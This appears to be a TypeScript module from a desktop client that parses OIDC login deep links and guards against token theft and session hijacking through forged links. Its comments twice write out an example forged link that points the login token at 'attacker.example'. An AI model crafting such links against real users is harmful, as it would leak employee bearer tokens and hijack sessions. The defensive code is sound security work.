import type { Context } from '@deepseek-ai/cordis'
import { DEFAULT_DEEP_LINK_SCHEME } from 'dsh-plugin-desktop/desktop-channel'
import { assertServerURLAllowed, AuthError, fetchJSON } from './server-connector/auth.ts'
import type { Session } from './server-connector/config.ts'

// 声明桌面壳转发的深链事件(desktop shell 的 ctx.emit)。
declare module '@deepseek-ai/cordis' {
  interface Events {
    'pico/deep-link'(url: string): void
  }
}

/**
 * Deep link handler — completes OIDC/OpenID browser login.
 *
 * The server OIDC callback redirects the system browser to
 * `<scheme>://auth?token=<t>[&server=<url>&user=<name>]`; the desktop shell
 * forwards it here as the 'pico/deep-link' event. scheme 随渠道包（安装包级），由
 * 桌面壳在组装期注入本插件（见 `installDeepLinkListener` 的说明）：渠道构建用它
 * 自己的 scheme，浏览器确认框里不出现厂商名。We parse it, validate the
 * server URL (https or loopback http), and store the session — the login
 * page's `/api/pico/auth/state` poll then flips to loggedIn and reloads.
 *
 * Security (srvcore-1,审计 2026-09-13 P0):a deep link is a local OS event
 * that **any** local process or web page can trigger, and the token inside it
 * is a real employee bearer token (90 天)。因此 token 只允许发往两台服务端
 * 之一:①当前活动会话的那台(刷新 token);②本机登录页正在等待的那台
 *(见 `noteBrowserLoginStarted`)。判定全部发生在**任何网络请求之前** ——
 * 旧实现先用 token 向链接里的 server 发 `/auth/me` 预验证、再判 F12,于是
 * token 已经躺在攻击者日志里。
 */
export function parseAuthDeepLink(
  url: string,
  scheme: string = DEFAULT_DEEP_LINK_SCHEME,
): Session | null {
  let parsed: URL
  try {
    parsed = new URL(url)
  } catch {
    return null
  }
  if (parsed.protocol !== `${scheme}:`) return null
  if (parsed.hostname !== 'auth') return null
  const token = parsed.searchParams.get('token')
  if (!token) return null
  let serverURL = parsed.searchParams.get('server') ?? ''
  // 与登录表单一致地归一尾斜杠:fetchJSON 内部会 normalize,但本机
  // 模板拼接路径处(如 auth-gate 的 archive 下载)不会——深链会话带尾
  // 斜杠会在这些路径产生 `//api/...` 双斜杠 404(2026-09-01 审计)。
  while (serverURL.endsWith('/')) serverURL = serverURL.slice(0, -1)
  return {
    serverURL,
    username: parsed.searchParams.get('user') ?? '',
    token,
  }
}

/**
 * 服务端身份串:scheme + host(去默认端口、host 小写;尾斜杠与子路径不参与)。
 *
 * 深链里的 `server` 与本地会话里存的 `serverURL` 可能只差书写形式
 * (`https://A.example:443/` vs `https://a.example`),逐字符比较会把同一台
 * 服务端判成"换端";反过来,攻击者也不能靠书写变体绕过比对。
 * @param raw - 未规范化的服务端地址。
 * @returns 身份串;无法解析时为 null(调用方按拒绝处理)。
 */
export function serverIdentity(raw: string): string | null {
  let parsed: URL
  try {
    parsed = new URL(raw)
  } catch {
    return null
  }
  if (parsed.protocol !== 'http:' && parsed.protocol !== 'https:') return null
  const defaultPort = (parsed.protocol === 'https:' && parsed.port === '443')
    || (parsed.protocol === 'http:' && parsed.port === '80')
  const port = defaultPort ? '' : parsed.port
  return `${parsed.protocol}//${parsed.hostname.toLowerCase()}${port === '' ? '' : `:${port}`}`
}

/**
 * 本机登录页正在等待的浏览器登录目标(身份串);null = 当前没有在等待。
 * 与登录页同进程、同模块实例,故用模块级单例共享(见 `noteBrowserLoginStarted`)。
 */
let pendingBrowserLogin: string | null = null

/**
 * 本机登录页宿主是否已经"接线"(`noteLoginPageWired`,由 auth-gate 的 `apply()`
 * 在**任何深链可能到达之前**同步调用)。
 *
 * 接线后进入严格模式:**未登录时只接受本机登录页正在等待的那台服务端**
 * (`pendingBrowserLogin`),没有等待目标时一律拒绝。
 *
 * 没接线(本进程没有登录页的嵌入式装配)时保留旧行为:出货装配
 * (`@picoaide/dsh-enterprise` 的 `cordis.patch.yml`)无条件挂载 auth-gate,并在
 * `apply()` 的第一句调用 `noteLoginPageWired()`,所以真实产品构建恒为严格模式;
 * 这扇门只向"根本没有登录页的嵌入式装配"敞开。
 */
let loginPageReportsPending = false

/**
 * 声明"本进程的登录页宿主已接线",从此未登录深链进入严格模式。
 *
 * R3-F3-N1a(P0,2026-09-13):严格模式此前**只**由 `noteBrowserLoginStarted()`
 * 打开,而官方构建(`brands/official/brand.json`)的 `server_url` 是空串 ⇒
 * 登录页下发时的武装被 `configuredServer === ''` 挡掉。于是官方/无预置地址的
 * 构建里,只要员工没点过"使用浏览器登录",`loginPageReportsPending` 恒为 false,
 * 未登录分支只剩 `assertServerURLAllowed`(https 一律放行):任意本机进程用
 * `picoaide://auth?token=…&server=https://attacker.example` 就能把真实员工
 * token 发给攻击者服务端、让攻击者服务端被采纳为会话,且零告警。
 *
 * 修法:「没有预置地址」不再是放行条件。auth-gate 的 `apply()` 无条件调用本函数
 * (有预置地址时同时 `noteBrowserLoginStarted(configuredServer)`);没有预置地址
 * 时 `pendingBrowserLogin` 保持 null ⇒ **未登录且未登记 = 一律拒绝深链**。
 * 密码登录不经过深链,不受影响;OIDC 部署必然先经登录页的 `browserLogin()`
 * 登记(`POST /api/pico/auth/browser-login`),所以也不会被锁死。
 */
export function noteLoginPageWired(): void {
  loginPageReportsPending = true
}

/**
 * 登记"本机登录页刚刚为哪台服务端发起了浏览器 SSO"(auth-gate 的
 * `browserLogin()` 在 `window.open` 之前调用)。
 *
 * 这是 srvcore-1 客户端一半的关键:没有它,任意本机进程(或网页里的自定义
 * scheme 跳转)都能构造 `picoaide://auth?token=…&server=https://attacker.example`,
 * 让客户端把后续会话指向攻击者服务端。传空串 = 清除。
 * @param serverURL - 登录页里用户填写并用于打开 login 地址的服务端。
 */
export function noteBrowserLoginStarted(serverURL: string): void {
  pendingBrowserLogin = serverIdentity(serverURL)
  loginPageReportsPending = true
}

/**
 * 清除待登录目标(登录页复位:取消授权、轮询超时、返回上一步)。
 * 清除后未登录状态下的深链一律拒绝 —— 迟到/伪造的回跳不再被接受。
 */
export function clearBrowserLoginPending(): void {
  pendingBrowserLogin = null
}

/** 当前待登录目标(身份串);仅供诊断与测试。 */
export function pendingBrowserLoginServer(): string | null {
  return pendingBrowserLogin
}

/**
 * 应用深链的 host（与 `@picoaide/dsh-wasm-apps-host` 的 `APP_DEEP_LINK_HOST` 同值）。
 *
 * 为什么这个常量出现在 auth 解析器里：`pico/deep-link` 是**多个监听器共用**的事件，
 * `app` host 属于应用深链（`<渠道 scheme>://app/<app_id>`，契约 §5.3），由
 * wasm-apps-host 的监听器消费。auth 解析器只需要"认出这不是给我的"（见 routeDeepLink），
 * 不需要解析它 —— 所以这里只钉 host 字面值，不复制那边的解析逻辑。
 */
export const APP_DEEP_LINK_HOST = 'app'

/** 深链的分流结果（见 {@link routeDeepLink}）。 */
export type DeepLinkRoute =
  /** 登录回调形状（`<scheme>://auth…`）：归本监听器，随后由 parseAuthDeepLink 判细节。 */
  | { readonly kind: 'auth' }
  /** 应用深链（`<scheme>://app/<app_id>`）：归 wasm-apps-host，本监听器**静默让行**。 */
  | { readonly kind: 'app' }
  /** 两者都不是：`reason` 是可判别的原因（进 warn，排障时不必猜）。 */
  | { readonly kind: 'foreign', readonly reason: string }

/**
 * 按 **scheme/host** 把一条深链分流给"归谁处理"（P2-4，2026-09-20 本机全功能实测）。
 *
 * 现场：员工点开同事分享的应用链接（`picoaide://app/shared-notes`）时，宿主日志出现
 * `pico-deep-link: ignored malformed deep link` —— 那是 enterprise 的 **auth** 解析器
 * 按登录回调格式（`<scheme>://auth?token=…`）解析应用深链的正常丢弃。链接本身没坏，
 * 但这条 warn 会把一次正常动作读成"分享链接是坏的"（排障时确实被这么读了）。
 *
 * 分流规则（**应用深链不落 warn**）：
 *  1. 解析不了 ⇒ foreign（`malformed url`）；
 *  2. **自定义 scheme + host=app** ⇒ `app`（本安装的或别家渠道的都算：别家的由
 *     wasm-apps-host 的 `pico/wasm-app-deep-link-foreign` 给用户可读提示）；
 *  3. scheme 不是本安装注入的那个 ⇒ foreign（`not our scheme (scheme=…)`）；
 *  4. host=auth ⇒ `auth`（后面由 `parseAuthDeepLink` 判"有没有 token"）；
 *  5. 其它 host ⇒ foreign（`host=…`）。
 *
 * 为什么不把 `http(s)://…/app/…` 也当应用深链：那是网页地址，不会被 OS 当成深链投递；
 * 真收到就说明有人构造了畸形输入，记一条带 reason 的 warn 比静默丢弃更有用。
 *
 * @param raw - 深链原文（`pico/deep-link` 事件的参数）。
 * @param scheme - 本安装的深链 scheme（**由桌面壳按渠道注入**；缺省官方值）。
 * @returns 分流结果。
 */
export function routeDeepLink(raw: string, scheme: string = DEFAULT_DEEP_LINK_SCHEME): DeepLinkRoute {
  let parsed: URL
  try {
    parsed = new URL(raw)
  } catch {
    return { kind: 'foreign', reason: 'malformed url' }
  }
  const protocol = parsed.protocol.replace(/:$/u, '').toLowerCase()
  const host = parsed.hostname.toLowerCase()
  const customScheme = protocol !== '' && protocol !== 'http' && protocol !== 'https'
  if (customScheme && host === APP_DEEP_LINK_HOST) return { kind: 'app' }
  if (protocol !== scheme.toLowerCase()) {
    return { kind: 'foreign', reason: `not our scheme (scheme=${protocol === '' ? '?' : protocol})` }
  }
  if (host === 'auth') return { kind: 'auth' }
  return { kind: 'foreign', reason: `host=${host === '' ? '?' : host}` }
}

/**
 * Install the deep-link listener; used by SessionService on construction.
 *
 * scheme 由**桌面壳注入**（`picoaide-session` 行 config 的 `deepLinkScheme`，
 * 见 desktop/src/profile.ts 的 `channelProfilePatches`），不在这里自己读随包
 * `channel.json`：本文件会被 tsdown **内联**进 enterprise 的 lib，而
 * `desktop-channel.ts` 里的路径是相对**它自己**的模块位置算的，于是
 * `../build/channel.json` 会指向 `@picoaide/dsh-enterprise/build/channel.json`
 * —— 那个文件在打包产物里不存在（asar 里只有应用根的 `/build/channel.json`），
 * 结果永远回落官方 scheme，渠道客户端的浏览器 SSO 回调被当成畸形链接丢掉
 * （2026-09-11 真机复现）。
 * @param ctx - Host context (carries the `pico/deep-link` event).
 * @param applySession - store a verified session.
 * @param getCurrent - current session (cross-server switch guard).
 * @param scheme - 本安装的深链 scheme（缺省官方值）。
 */
export function installDeepLinkListener(
  ctx: Context,
  applySession: (session: Session) => void,
  getCurrent?: () => Session | null,
  scheme: string = DEFAULT_DEEP_LINK_SCHEME,
): () => void {
  return ctx.on('pico/deep-link', (url: unknown) => {
    if (typeof url !== 'string') return
    const session = parseAuthDeepLink(url, scheme)
    if (session === null) {
      // 分流先于告警（P2-4）：应用深链**不是**畸形登录回调，本监听器只是不消费它 ——
      // 在这里 warn 会把一次正常动作记成告警（现场读成"分享链接是坏的"）。
      const route = routeDeepLink(url, scheme)
      if (route.kind === 'app') return
      // 其余情况保留 warn（可能是真的配错 scheme / 写错的回调），但把**可判别的原因**
      // 附上：host=auth 无 token 与"不是登录回调"是两件事，排障时不该靠猜。
      ctx.logger?.warn(route.kind === 'auth'
        ? 'pico-deep-link: ignored malformed deep link (host=auth without token)'
        : `pico-deep-link: ignored malformed deep link (not an auth callback: ${route.reason})`)
      return
    }
    // The link may omit server/user (older server or manual invocation):
    // without a server the token cannot be attached to any gateway.
    if (session.serverURL === '' || session.username === '') {
      ctx.logger?.warn('pico-deep-link: ignored link without server/user')
      return
    }
    try {
      assertServerURLAllowed(session.serverURL)
    } catch (error) {
      ctx.logger?.warn(`pico-deep-link: rejected unsafe server: ${error instanceof AuthError ? error.message : String(error)}`)
      return
    }
    const identity = serverIdentity(session.serverURL)
    if (identity === null) {
      ctx.logger?.warn('pico-deep-link: ignored unparsable server')
      return
    }
    // ---- 判定必须在任何网络请求之前(srvcore-1) ----
    // F12(审计 2026-09-11):已登录时拒绝把活动会话静默切换到**另一台**
    // 服务端 —— 任意本机进程都能触发该 scheme,配合攻击者服务器与自签 token
    // 可完成会话劫持。同一台服务端(书写变体归一后相同)视作 token 刷新,放行。
    const existing = getCurrent?.() ?? null
    if (existing !== null) {
      if (serverIdentity(existing.serverURL) !== identity) {
        ctx.logger?.warn(`pico-deep-link: refused server switch while signed in; sign out first (${JSON.stringify(session.serverURL)})`)
        return
      }
    } else if (loginPageReportsPending && pendingBrowserLogin !== identity) {
      // srvcore-1 客户端一半:未登录时只接受本机登录页正在等待的服务端。
      // 否则一个伪造的深链就能把用户后续的对话/技能全部指向攻击者服务端。
      // 接线后 `pendingBrowserLogin === null`(官方构建没有预置地址、用户也
      // 没点过浏览器登录)同样走这里 —— "没有等待目标"是拒绝理由,不是放行
      // 理由(R3-N1a:官方构建上这条守卫曾经整体是死的)。
      ctx.logger?.warn(`pico-deep-link: refused server no local login is waiting for (${JSON.stringify(session.serverURL)})`)
      return
    }
    // 安全:深链 token 先对目标网关预验证(/auth/me 带 token 探通),避免
    // 攻击者可控网关返回合法 bootstrap 把活动 session 劫持到任意 server——
    // 验证失败即拒绝,成功才 applySession(fire-and-forget,失败静默降级)。
    void (async (): Promise<void> => {
      try {
        await fetchJSON(session.serverURL, '/api/client/v2/auth/me', { token: session.token })
      } catch (error) {
        // 日志消毒:serverURL/username 来自链接参数(攻击者可控),
        // JSON.stringify 剥离换行/控制符,防日志注入(2026-09-01 审计)。
        ctx.logger?.warn(`pico-deep-link: token rejected by ${JSON.stringify(session.serverURL)}: ${error instanceof Error ? error.message : String(error)}`)
        return
      }
      ctx.logger?.info(`pico-deep-link: logged in as ${JSON.stringify(session.username)}`)
      applySession(session)
    })()
  })
}
